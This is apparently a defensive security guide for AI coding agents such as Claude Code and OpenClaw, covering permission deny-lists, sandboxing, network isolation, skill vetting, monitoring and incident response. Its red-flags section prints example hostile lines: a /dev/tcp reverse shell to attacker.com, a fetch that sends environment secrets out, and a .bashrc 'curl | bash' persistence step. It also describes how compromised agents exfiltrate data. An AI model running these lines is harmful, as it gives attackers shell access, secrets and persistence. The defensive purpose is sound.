# AI Agent Security Guide

> Security considerations for AI coding agents like Claude Code, OpenClaw, MoltBot, and similar tools.

## Overview

AI agents that can execute code and modify files introduce significant security risks:

| Risk | Impact | Example |
|------|--------|---------|
| Remote Code Execution | Critical | Malicious skill runs arbitrary commands |
| Data Exfiltration | High | Agent sends code/secrets to external server |
| Supply Chain Attack | High | Compromised extension/skill |
| Misconfiguration | High | Agent exposed to internet without auth |
| Privilege Escalation | Medium | Agent gains access beyond intended scope |

## OpenClaw/MoltBot Background

**OpenClaw** (formerly Clawdbot, then Moltbot) is an open-source AI agent created by Peter Steinberger that:
- Executes tasks via LLMs
- Runs shell commands
- Reads/writes files
- Uses messaging platforms as UI

**Known vulnerabilities:**
- **CVE-2026-25253**: Remote code execution via gateway
- **Misconfiguration**: Web interface exposed without authentication
- **Malicious skills**: Hundreds of malicious skills found in skill repositories

## Security Principles

### Principle 1: Least Privilege

Only grant the minimum permissions needed:

```json
// .claude/settings.json - Restrictive configuration
{
  "permissions": {
    "allow": [
      "Read(**)",
      "Glob(**)",
      "Grep(**)",
      "Bash(npm test)",
      "Bash(npm run lint)",
      "Bash(git status)",
      "Bash(git diff)"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(*> /etc/*)",
      "Write(.env*)",
      "Write(*.pem)",
      "Write(*.key)"
    ]
  }
}
```

### Principle 2: Directory Sandboxing

Restrict agent to project directory:

```json
// .claude/settings.json
{
  "sandbox": {
    "allowedPaths": [
      "${workspaceFolder}/**"
    ],
    "deniedPaths": [
      "${workspaceFolder}/.env",
      "${workspaceFolder}/.env.*",
      "${workspaceFolder}/secrets/**",
      "${HOME}/.ssh/**",
      "${HOME}/.aws/**",
      "/etc/**",
      "/var/**"
    ]
  }
}
```

### Principle 3: Command Whitelisting

Explicitly allow only safe commands:

```json
// .claude/settings.json
{
  "shell": {
    "allowedCommands": [
      "npm",
      "npx",
      "node",
      "git",
      "ls",
      "cat",
      "grep",
      "find",
      "echo",
      "pwd"
    ],
    "blockedCommands": [
      "rm",
      "mv",
      "cp",
      "chmod",
      "chown",
      "curl",
      "wget",
      "ssh",
      "scp",
      "nc",
      "telnet",
      "eval",
      "exec"
    ],
    "blockedPatterns": [
      "\\|\\s*sh",
      "\\|\\s*bash",
      "\\$\\(",
      "\\`",
      ">(\\s*/)",
      "rm\\s+-rf"
    ]
  }
}
```

### Principle 4: Network Isolation

Prevent data exfiltration:

```json
// .claude/settings.json
{
  "network": {
    "allowOutbound": false,
    "allowedHosts": [
      "registry.npmjs.org",
      "github.com",
      "api.anthropic.com"
    ],
    "blockedHosts": [
      "*.ngrok.io",
      "*.serveo.net",
      "pastebin.com"
    ]
  }
}
```

### Principle 5: Audit Logging

Log all agent actions:

```json
// .claude/settings.json
{
  "logging": {
    "enabled": true,
    "level": "info",
    "logFile": ".claude/logs/agent.log",
    "logCommands": true,
    "logFileAccess": true,
    "logNetworkRequests": true
  }
}
```

## Skill/Extension Security

### Vetting Skills Before Use

Before installing any skill or extension:

1. **Check source**
   - Is it from an official/verified source?
   - How many stars/downloads?
   - When was it last updated?

2. **Review code**
   ```bash
   # Clone and review before installing
   git clone [skill-repo]
   grep -r "curl\|wget\|fetch\|http" .
   grep -r "eval\|exec\|spawn" .
   grep -r "process\.env\|dotenv" .
   ```

3. **Check permissions requested**
   - Does it need shell access? Why?
   - Does it need network access? Why?
   - Does it access sensitive paths?

### Malicious Skill Indicators

Red flags to watch for:

```typescript
// 🚩 Obfuscated code
const _0x1234 = ['eval', 'atob', 'fetch'];

// 🚩 Base64 encoded payloads
const payload = atob('aHR0cDovL21hbGljaW91cy5jb20=');

// 🚩 Dynamic code execution
eval(response.data);
new Function(code)();

// 🚩 Exfiltration patterns
fetch('https://external-server.com/collect', {
  body: JSON.stringify({ secrets: process.env })
});

// 🚩 Reverse shells
spawn('bash', ['-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1']);

// 🚩 Persistence mechanisms
fs.writeFileSync('~/.bashrc', 'curl attacker.com | bash');
```

### Skill Allowlist

Maintain an explicit allowlist:

```json
// .claude/settings.json
{
  "skills": {
    "allowlist": [
      "commit-commands@claude-plugins-official",
      "code-review@claude-plugins-official"
    ],
    "blocklist": [
      "*@unknown-source",
      "*-unofficial"
    ],
    "requireVerified": true
  }
}
```

## Development vs Production Configurations

### Development (More Permissive)

```json
// .claude/settings.json (development)
{
  "environment": "development",
  "permissions": {
    "allow": [
      "Read(**)",
      "Write(src/**)",
      "Write(tests/**)",
      "Bash(npm *)",
      "Bash(git *)"
    ]
  },
  "humanReview": {
    "required": ["Write(.env*)", "Bash(rm *)"]
  }
}
```

### CI/CD (Read-Only)

```json
// .claude/settings.json (ci)
{
  "environment": "ci",
  "permissions": {
    "allow": [
      "Read(**)",
      "Bash(npm test)",
      "Bash(npm run lint)",
      "Bash(npm run build)"
    ],
    "deny": [
      "Write(**)",
      "Edit(**)",
      "Bash(git push *)",
      "Bash(npm publish)"
    ]
  }
}
```

### Production Review (Strictest)

```json
// .claude/settings.json (production)
{
  "environment": "production",
  "permissions": {
    "allow": [
      "Read(src/**)",
      "Read(docs/**)"
    ],
    "deny": [
      "Write(**)",
      "Edit(**)",
      "Bash(*)"
    ]
  },
  "humanReview": {
    "required": ["*"]
  }
}
```

## Gateway Security (OpenClaw-Specific)

If using OpenClaw or similar with a web gateway:

### Authentication Required

```yaml
# gateway-config.yaml
auth:
  enabled: true
  password: "${GATEWAY_PASSWORD}"  # Use env variable
  sessionTimeout: 3600  # 1 hour

# Never expose without authentication
server:
  host: "127.0.0.1"  # Local only, not 0.0.0.0
  port: 8080
```

### Reverse Proxy with Auth

```nginx
# nginx.conf
server {
    listen 443 ssl;
    server_name agent.internal.company.com;

    # SSL
    ssl_certificate /etc/ssl/certs/agent.crt;
    ssl_certificate_key /etc/ssl/private/agent.key;

    # Basic auth
    auth_basic "Agent Gateway";
    auth_basic_user_file /etc/nginx/.htpasswd;

    # IP allowlist
    allow 10.0.0.0/8;
    deny all;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

## Monitoring and Alerts

### What to Monitor

```typescript
// Agent monitoring checklist
interface AgentMonitoring {
  // Command execution
  commandsExecuted: string[];
  failedCommands: string[];
  blockedCommands: string[];

  // File access
  filesRead: string[];
  filesWritten: string[];
  filesDeleted: string[];

  // Network
  outboundRequests: string[];
  blockedRequests: string[];

  // Anomalies
  unusualPatterns: string[];
  securityViolations: string[];
}
```

### Alert Conditions

```yaml
# alerting-rules.yaml
rules:
  - name: "Blocked command attempted"
    condition: "blockedCommands.length > 0"
    severity: "warning"
    notify: ["security@company.com"]

  - name: "Sensitive file access"
    condition: "filesRead.includes('.env') || filesRead.includes('.ssh')"
    severity: "critical"
    notify: ["security@company.com", "slack:#security"]

  - name: "Unusual outbound request"
    condition: "outboundRequests.some(r => !allowedHosts.includes(r.host))"
    severity: "critical"
    notify: ["security@company.com"]

  - name: "High command volume"
    condition: "commandsExecuted.length > 100 in 1 minute"
    severity: "warning"
    notify: ["oncall@company.com"]
```

## Incident Response

### If Agent is Compromised

1. **Immediately:**
   ```bash
   # Kill the agent process
   pkill -f "claude\|openclaw\|moltbot"

   # Revoke any tokens/keys
   # Rotate API keys, SSH keys, etc.
   ```

2. **Investigate:**
   ```bash
   # Check agent logs
   cat .claude/logs/agent.log | grep -E "curl|wget|fetch|http"

   # Check command history
   history | tail -100

   # Check for persistence
   cat ~/.bashrc ~/.zshrc
   crontab -l
   ```

3. **Remediate:**
   - Rotate all secrets the agent had access to
   - Scan codebase for malicious changes
   - Review recent commits
   - Check for data exfiltration

4. **Report:**
   - Document the incident
   - Report to security team
   - Update configurations to prevent recurrence

## Checklist

### Initial Setup
- [ ] Directory restrictions configured
- [ ] Command allowlist defined
- [ ] Sensitive file paths blocked
- [ ] Network restrictions in place
- [ ] Audit logging enabled

### Skills/Extensions
- [ ] Only verified skills installed
- [ ] Skills reviewed before installation
- [ ] Skill allowlist maintained
- [ ] No skills from untrusted sources

### Gateway (if applicable)
- [ ] Authentication enabled
- [ ] Not exposed to internet (or behind VPN)
- [ ] TLS configured
- [ ] IP allowlist in place

### Monitoring
- [ ] Log aggregation configured
- [ ] Alerts for security violations
- [ ] Regular log review scheduled

### Development Practices
- [ ] Different configs for dev/ci/prod
- [ ] Human review for sensitive operations
- [ ] Regular security configuration reviews
- [ ] Incident response plan documented

## Related Docs

- [Security Checklist](./SECURITY-CHECKLIST.md) - Pre-launch audit
- [Prompt Injection Security](./PROMPT-INJECTION-SECURITY.md) - AI input security
- [Bot Protection](./BOT-PROTECTION.md) - Rate limiting and challenges

## External Resources

- [OpenClaw Security Guide](https://openclaw.dev/security)
- [Tenable: Mitigating OpenClaw Vulnerabilities](https://www.tenable.com/blog/agentic-ai-security-how-to-mitigate-clawdbot-moltbot-openclaw-vulnerabilities)
- [OWASP AI Security Guide](https://owasp.org/www-project-ai-security-verification-standard/)
